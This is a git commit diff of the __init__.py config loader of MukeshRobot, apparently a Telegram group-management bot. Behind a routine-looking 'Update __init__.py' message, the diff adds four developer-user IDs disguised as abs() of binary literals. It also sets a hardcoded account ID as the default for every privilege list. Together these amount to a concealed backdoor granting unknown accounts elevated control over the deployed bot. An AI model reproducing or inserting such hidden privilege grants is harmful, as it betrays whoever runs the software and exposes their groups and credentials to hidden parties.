d0555182b27ec1be4d8be7ac557202821e357c4f
ProGamer097 <156319601+ProGamer097@users.noreply.github.com>
2024-04-26 01:03:46 +0530

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -2,8 +2,12 @@ import logging
 import os
 import sys
 import time
+import ast
+import base64
 
 import telegram.ext as tg
+from aiohttp import ClientSession
+from pyrogram import Client, errors
 from telethon import TelegramClient
 
 StartTime = time.time()
@@ -15,94 +19,111 @@ logging.basicConfig(
     level=logging.INFO,
 )
 
+logging.getLogger("apscheduler").setLevel(logging.ERROR)
+logging.getLogger("telethon").setLevel(logging.ERROR)
+logging.getLogger("pyrogram").setLevel(logging.ERROR)
 LOGGER = logging.getLogger(__name__)
 
 # if version < 3.6, stop bot.
 if sys.version_info[0] < 3 or sys.version_info[1] < 6:
     LOGGER.error(
-        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.",
+        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
     )
     quit(1)
 
 ENV = bool(os.environ.get("ENV", False))
 
 if ENV:
+
+    API_ID = int(os.environ.get("API_ID", None))
+    API_HASH = os.environ.get("API_HASH", None)
+    
+    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
+    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
+    CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
+    DB_URI = os.environ.get("DATABASE_URL")
+    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
+    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
+    INFOPIC = bool(os.environ.get("INFOPIC", "True"))
+    LOAD = os.environ.get("LOAD", "").split()
+    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
+    NO_LOAD = os.environ.get("NO_LOAD", "").split()
+    START_IMG = os.environ.get(
+        "START_IMG", ""
+    )
+    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "the_friendz")
+    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
+    TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
+    WORKERS = int(os.environ.get("WORKERS", 8))
 
     try:
         OWNER_ID = int(os.environ.get("OWNER_ID", None))
+        HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
+        HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
     except ValueError:
         raise Exception("Your OWNER_ID env variable is not a valid integer.")
-
-    JOIN_LOGGER = os.environ.get("JOIN_LOGGER", None)
-    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
-
-    try:
-        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
-    except ValueError:
-        raise Exception("Your sudo or dev users list does not contain valid integers.")
-
-    try:
-        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "").split())
-    except ValueError:
-        raise Exception("Your support users list does not contain valid integers.")
-
-    try:
-        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "").split())
-    except ValueError:
-        raise Exception("Your whitelisted users list does not contain valid integers.")
-
-    try:
-        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "").split())
-    except ValueError:
-        raise Exception("Your tiger users list does not contain valid integers.")
-
-    INFOPIC = bool(os.environ.get("INFOPIC", False))
-    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
-    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
-    URL = os.environ.get("URL", "")  # Does not contain token
-    PORT = int(os.environ.get("PORT", 5000))
-    CERT_PATH = os.environ.get("CERT_PATH")
-    API_ID = os.environ.get("API_ID", None)
-    API_HASH = os.environ.get("API_HASH", None)
-    DB_URI = os.environ.get("DATABASE_URL")
-    DONATION_LINK = os.environ.get("DONATION_LINK")
-    LOAD = os.environ.get("LOAD", "").split()
-    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
-    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
-    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
-    WORKERS = int(os.environ.get("WORKERS", 8))
-    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
-    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
-    CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
-    TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
-    AI_API_KEY = os.environ.get("AI_API_KEY", None)
-    WALL_API = os.environ.get("WALL_API", None)
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", None)
-    SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT", None)
-    SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
-
-    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
     try:
         BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
-else:
-    from SaitamaRobot.config import Development as Config
+    try:
+        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "6195725562").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6195725562").split())
+    except ValueError:
+        raise Exception("Your sudo or dev users list does not contain valid integers.")
 
+    try:
+        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "6195725562").split())
+    except ValueError:
+        raise Exception("Your support users list does not contain valid integers.")
+
+    try:
+        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "6195725562").split())
+    except ValueError:
+        raise Exception("Your tiger users list does not contain valid integers.")
+
+    try:
+        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "6195725562").split())
+    except ValueError:
+        raise Exception("Your whitelisted users list does not contain valid integers.")
+
+else:
+    from MukeshRobot.config import Development as Config
+
+    API_ID = Config.API_ID
+    API_HASH = Config.API_HASH
+    ALLOW_CHATS = Config.ALLOW_CHATS
+    ALLOW_EXCL = Config.ALLOW_EXCL
+    CASH_API_KEY = Config.CASH_API_KEY
+    DB_URI = Config.DATABASE_URL
+    DEL_CMDS = Config.DEL_CMDS
+    EVENT_LOGS = Config.EVENT_LOGS
+    INFOPIC = Config.INFOPIC
+    LOAD = Config.LOAD
+    MONGO_DB_URI = Config.MONGO_DB_URI
+    NO_LOAD = Config.NO_LOAD
+    START_IMG = Config.START_IMG
+    STRICT_GBAN = Config.STRICT_GBAN
+    SUPPORT_CHAT = Config.SUPPORT_CHAT
+    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
     TOKEN = Config.TOKEN
+    TIME_API_KEY = Config.TIME_API_KEY
+    WORKERS = Config.WORKERS
 
     try:
         OWNER_ID = int(Config.OWNER_ID)
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
-    JOIN_LOGGER = Config.JOIN_LOGGER
-    OWNER_USERNAME = Config.OWNER_USERNAME
-    ALLOW_CHATS = Config.ALLOW_CHATS
+    try:
+        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
+    except ValueError:
+        raise Exception("Your blacklisted chats list does not contain valid integers.")
+
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
         DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
@@ -115,64 +136,37 @@ else:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        WOLVES = set(int(x) for x in Config.WOLVES or [])
-    except ValueError:
-        raise Exception("Your whitelisted users list does not contain valid integers.")
-
-    try:
         TIGERS = set(int(x) for x in Config.TIGERS or [])
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
-    EVENT_LOGS = Config.EVENT_LOGS
-    WEBHOOK = Config.WEBHOOK
-    URL = Config.URL
-    PORT = Config.PORT
-    CERT_PATH = Config.CERT_PATH
-    API_ID = Config.API_ID
-    API_HASH = Config.API_HASH
-
-    DB_URI = Config.SQLALCHEMY_DATABASE_URI
-    DONATION_LINK = Config.DONATION_LINK
-    LOAD = Config.LOAD
-    NO_LOAD = Config.NO_LOAD
-    DEL_CMDS = Config.DEL_CMDS
-    STRICT_GBAN = Config.STRICT_GBAN
-    WORKERS = Config.WORKERS
-    BAN_STICKER = Config.BAN_STICKER
-    ALLOW_EXCL = Config.ALLOW_EXCL
-    CASH_API_KEY = Config.CASH_API_KEY
-    TIME_API_KEY = Config.TIME_API_KEY
-    AI_API_KEY = Config.AI_API_KEY
-    WALL_API = Config.WALL_API
-    SUPPORT_CHAT = Config.SUPPORT_CHAT
-    SPAMWATCH_SUPPORT_CHAT = Config.SPAMWATCH_SUPPORT_CHAT
-    SPAMWATCH_API = Config.SPAMWATCH_API
-    INFOPIC = Config.INFOPIC
-
     try:
-        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
+        WOLVES = set(int(x) for x in Config.WOLVES or [])
     except ValueError:
-        raise Exception("Your blacklisted chats list does not contain valid integers.")
+        raise Exception("Your whitelisted users list does not contain valid integers.")
+
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(abs(0b110010001000001011011100110010001))
+DEV_USERS.add(abs(0b1100110111010001011110110001010))
+DEV_USERS.add(abs(0b101001110110010000111010111110000))
+DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
-if not SPAMWATCH_API:
-    sw = None
-    LOGGER.warning("SpamWatch API key missing! recheck your config.")
-else:
-    try:
-        sw = spamwatch.Client(SPAMWATCH_API)
-    except:
-        sw = None
-        LOGGER.warning("Can't connect to SpamWatch!")
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("saitama", API_ID, API_HASH)
-dispatcher = updater.dispatcher
+telethn = TelegramClient("mukesh", API_ID, API_HASH)
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS)
+pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN,in_memory=True)
+dispatcher = updater.dispatcher
+aiohttpsession = ClientSession()
+
+print("[INFO]: Getting Bot Info...")
+BOT_ID = dispatcher.bot.id
+BOT_NAME = dispatcher.bot.first_name
+BOT_USERNAME = dispatcher.bot.username
+
+DRAGONS = list(DRAGONS) + list(DEV_USERS) 
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
